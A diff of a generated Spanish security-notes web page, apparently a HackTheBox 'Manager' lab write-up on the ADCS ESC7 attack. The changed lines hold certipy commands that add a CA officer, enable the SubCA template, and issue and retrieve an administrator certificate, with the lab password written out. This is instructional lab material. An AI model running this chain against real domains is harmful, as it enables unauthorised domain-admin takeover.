@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1719,11 +1779,11 @@
 <p>A continuación, se detalla un ejemplo práctico sobre cómo explotar esta vulnerabilidad usando la herramienta <code>certipy</code>.</p>
 <hr />
 <h3 id="deteccion-de-esc7">🔎 Detección de ESC7<a class="headerlink" href="#deteccion-de-esc7" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span><span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span><span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
 </span></code></pre></div>
 <p><strong>Resultado relevante:</strong>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Vulnerabilities
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>ESC7<span class="w"> </span>:<span class="w"> </span><span class="s1">&#39;MANAGER.HTB\\Raven&#39;</span><span class="w"> </span>has<span class="w"> </span>dangerous<span class="w"> </span>permissions
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>ESC7<span class="w"> </span>:<span class="w"> </span><span class="s1">'MANAGER.HTB\\Raven'</span><span class="w"> </span>has<span class="w"> </span>dangerous<span class="w"> </span>permissions
 </span></code></pre></div></p>
 <blockquote>
 <p>Esto confirma que el usuario <code>Raven</code> tiene permisos como <code>ManageCA</code> sobre la CA <code>manager-DC01-CA</code>.</p>
@@ -1731,35 +1791,35 @@
 <hr />
 <h3 id="explotacion-de-esc7">✅ Explotación de ESC7<a class="headerlink" href="#explotacion-de-esc7" title="Permanent link">&para;</a></h3>
 <h4 id="1-anadir-al-usuario-como-officer-de-la-ca">1. Añadir al usuario como "officer" de la CA<a class="headerlink" href="#1-anadir-al-usuario-como-officer-de-la-ca" title="Permanent link">&para;</a></h4>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-add-officer<span class="w"> </span>raven<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-add-officer<span class="w"> </span>raven<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
 </span></code></pre></div>
 Esto otorga permisos de <code>ManageCertificates</code>, necesarios para aprobar solicitudes manualmente.</p>
 <h4 id="2-habilitar-plantilla-vulnerable-subca">2. Habilitar plantilla vulnerable (SubCA)<a class="headerlink" href="#2-habilitar-plantilla-vulnerable-subca" title="Permanent link">&para;</a></h4>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-enable-template<span class="w"> </span><span class="s1">&#39;SubCA&#39;</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-enable-template<span class="w"> </span><span class="s1">'SubCA'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
 </span></code></pre></div>
 <h4 id="3-opcional-listar-plantillas-activas">3. (Opcional) Listar plantillas activas<a class="headerlink" href="#3-opcional-listar-plantillas-activas" title="Permanent link">&para;</a></h4>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-list-templates<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-list-templates<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
 </span></code></pre></div>
 <h4 id="4-solicitar-un-certificado-como-administrator">4. Solicitar un certificado como <code>administrator</code><a class="headerlink" href="#4-solicitar-un-certificado-como-administrator" title="Permanent link">&para;</a></h4>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;SubCA&#39;</span><span class="w"> </span><span class="se">\</span>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">'SubCA'</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-upn<span class="w"> </span>administrator@manager.htb<span class="w"> </span>-target<span class="w"> </span>manager.htb
 </span></code></pre></div>
 Esto falla con error <code>CERTSRV_E_TEMPLATE_DENIED</code>, pero genera un <code>Request ID</code> y guarda la clave privada.</p>
 <h4 id="5-volver-a-agregarse-como-officer-si-fue-revertido-por-el-entorno">5. Volver a agregarse como officer (si fue revertido por el entorno)<a class="headerlink" href="#5-volver-a-agregarse-como-officer-si-fue-revertido-por-el-entorno" title="Permanent link">&para;</a></h4>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-add-officer<span class="w"> </span>raven<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-add-officer<span class="w"> </span>raven<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
 </span></code></pre></div>
 <h4 id="6-aprobar-manualmente-la-solicitud-usando-el-request-id-ej-19">6. Aprobar manualmente la solicitud usando el Request ID (ej. 19)<a class="headerlink" href="#6-aprobar-manualmente-la-solicitud-usando-el-request-id-ej-19" title="Permanent link">&para;</a></h4>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-issue-request<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-issue-request<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
 </span></code></pre></div>
 <h4 id="7-descargar-el-certificado-emitido">7. Descargar el certificado emitido<a class="headerlink" href="#7-descargar-el-certificado-emitido" title="Permanent link">&para;</a></h4>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;R4v3nBe5tD3veloP3r!123&#39;</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-ca<span class="w"> </span><span class="s1">&#39;manager-DC01-CA&#39;</span><span class="w"> </span>-retrieve<span class="w"> </span><span class="m">19</span>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>raven@manager.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">'R4v3nBe5tD3veloP3r!123'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-ca<span class="w"> </span><span class="s1">'manager-DC01-CA'</span><span class="w"> </span>-retrieve<span class="w"> </span><span class="m">19</span>
 </span></code></pre></div>
 Esto genera <code>administrator.pfx</code>, un archivo que contiene el certificado y la clave privada.</p>
 <hr />
@@ -1851,7 +1911,7 @@ Esto genera <code>administrator.pfx</code>, un archivo que contiene el certifica
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
